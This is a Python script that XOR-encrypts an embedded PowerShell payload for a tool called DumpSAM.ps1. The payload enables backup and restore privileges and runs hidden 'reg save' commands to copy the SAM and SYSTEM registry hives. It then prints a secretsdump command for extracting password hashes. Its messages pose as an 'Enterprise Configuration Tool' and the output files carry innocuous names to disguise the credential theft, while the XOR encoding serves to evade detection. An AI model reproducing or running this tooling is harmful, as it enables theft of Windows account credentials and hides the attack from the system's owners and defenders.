#!/usr/bin/env python3
# XOR Payload Generator for DumpSAM.ps1

payload_code = r'''# Decoded payload - SAM extraction module
param($Context)

# Bypasses already executed in launcher - proceed directly to functionality

function Enable-TokenPrivilege {
    param([string]$Privilege)

    $definition = @"
using System;
using System.Runtime.InteropServices;

public class TokenManipulator {
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr hObject);

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID {
        public uint LowPart;
        public int HighPart;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID_AND_ATTRIBUTES {
        public LUID Luid;
        public uint Attributes;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_PRIVILEGES {
        public uint PrivilegeCount;
        public LUID_AND_ATTRIBUTES Privileges;
    }
}
"@

    try {
        Add-Type -TypeDefinition $definition -ErrorAction Stop
    } catch {}

    $TOKEN_ADJUST = 0x0020
    $TOKEN_QUERY = 0x0008
    $SE_PRIV_ENABLED = 0x00000002

    $hToken = [IntPtr]::Zero
    $hProcess = [TokenManipulator]::GetCurrentProcess()

    if ([TokenManipulator]::OpenProcessToken($hProcess, ($TOKEN_ADJUST -bor $TOKEN_QUERY), [ref]$hToken)) {
        $luid = New-Object TokenManipulator+LUID
        if ([TokenManipulator]::LookupPrivilegeValue($null, $Privilege, [ref]$luid)) {
            $tp = New-Object TokenManipulator+TOKEN_PRIVILEGES
            $tp.PrivilegeCount = 1
            $tp.Privileges.Luid = $luid
            $tp.Privileges.Attributes = $SE_PRIV_ENABLED
            [TokenManipulator]::AdjustTokenPrivileges($hToken, $false, [ref]$tp, 0, [IntPtr]::Zero, [IntPtr]::Zero) | Out-Null
        }
        [TokenManipulator]::CloseHandle($hToken) | Out-Null
    }
}

Write-Host "[+] Enterprise Configuration Tool v4.0" -ForegroundColor Cyan
Write-Host ""

Enable-TokenPrivilege -Privilege "SeBackupPrivilege"
Enable-TokenPrivilege -Privilege "SeRestorePrivilege"

$outputPath = if ($Context.Path) { $Context.Path } else { Join-Path $env:TEMP "ConfigExport_$(Get-Date -Format 'yyyyMMdd_HHmmss')" }

if (-not (Test-Path $outputPath)) {
    New-Item -ItemType Directory -Path $outputPath -Force | Out-Null
}

$samFile = Join-Path $outputPath "security_accounts.dat"
$systemFile = Join-Path $outputPath "system_config.dat"

Write-Host "[*] Exporting system configuration..." -ForegroundColor Yellow

$proc1 = Start-Process -FilePath "reg.exe" -ArgumentList "save HKLM\SAM `"$samFile`"" -Wait -PassThru -WindowStyle Hidden
$proc2 = Start-Process -FilePath "reg.exe" -ArgumentList "save HKLM\SYSTEM `"$systemFile`"" -Wait -PassThru -WindowStyle Hidden

if ($proc1.ExitCode -eq 0 -and $proc2.ExitCode -eq 0) {
    Write-Host "[+] Configuration export completed successfully" -ForegroundColor Green
    Write-Host ""
    Write-Host "Output files:" -ForegroundColor White
    Write-Host "  - $samFile"
    Write-Host "  - $systemFile"
    Write-Host ""
    Write-Host "Extract credentials with:" -ForegroundColor Cyan
    Write-Host "  secretsdump.py -sam '$samFile' -system '$systemFile' LOCAL" -ForegroundColor White
} else {
    Write-Host "[-] Configuration export failed" -ForegroundColor Red
}
'''

# XOR encryption key
xor_key = bytes([0x4B,0x65,0x79,0x53,0x65,0x63,0x75,0x72,0x65,0x32,0x30,0x32,0x35])

# Convert payload to bytes
payload_bytes = payload_code.encode('utf-8')

# XOR encrypt
encrypted = bytearray()
for i, byte in enumerate(payload_bytes):
    encrypted.append(byte ^ xor_key[i % len(xor_key)])

# Generate PowerShell array format
print("=" * 80)
print("XOR ENCRYPTED PAYLOAD FOR DumpSAM.ps1")
print("=" * 80)
print()
print("XOR Key:")
print(f"$xorKey = @({','.join(f'0x{b:02X}' for b in xor_key)})")
print()
print("Encrypted Payload (copy this to DumpSAM.ps1):")
print("$encryptedPayload = @(")

# Split into chunks of 20 bytes per line for readability
chunks = [encrypted[i:i+20] for i in range(0, len(encrypted), 20)]
for i, chunk in enumerate(chunks):
    hex_values = ','.join(f'0x{b:02X}' for b in chunk)
    if i < len(chunks) - 1:
        print(f"    {hex_values},")
    else:
        print(f"    {hex_values}")

print(")")
print()
print(f"Payload size: {len(encrypted)} bytes")
print()

# Test decryption
decrypted = bytearray()
for i, byte in enumerate(encrypted):
    decrypted.append(byte ^ xor_key[i % len(xor_key)])

decrypted_text = decrypted.decode('utf-8')

if decrypted_text == payload_code:
    print("[+] Decryption test PASSED")
else:
    print("[-] Decryption test FAILED")
    print(f"Expected length: {len(payload_code)}")
    print(f"Got length: {len(decrypted_text)}")
